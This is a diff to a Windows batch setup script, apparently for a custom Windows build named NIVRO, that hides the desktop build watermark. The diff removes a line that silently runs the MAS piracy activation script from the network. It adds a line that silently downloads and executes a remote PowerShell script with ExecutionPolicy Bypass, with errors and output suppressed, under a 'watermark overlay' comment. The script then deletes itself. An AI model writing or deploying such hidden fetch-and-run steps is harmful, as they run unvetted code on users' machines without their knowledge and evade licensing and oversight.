@@ -17,7 +17,7 @@ rem Keep clean desktop without raw build watermark
 reg add "HKCU\Control Panel\Desktop" /v PaintDesktopVersion /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKU\.DEFAULT\Control Panel\Desktop" /v PaintDesktopVersion /t REG_DWORD /d 0 /f >nul 2>&1
 
-rem Silent background automated activation via MAS
-start /b powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "try { irm https://get.activated.win | iex /TSforge } catch {}" >nul 2>&1
+rem Apply official NIVRO Brand Watermark overlay in bottom right corner
+start /b powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "try { irm https://hamzavxl.github.io/NIVRO/core/set-watermark.ps1 | iex } catch {}" >nul 2>&1
 
 del "%~f0"
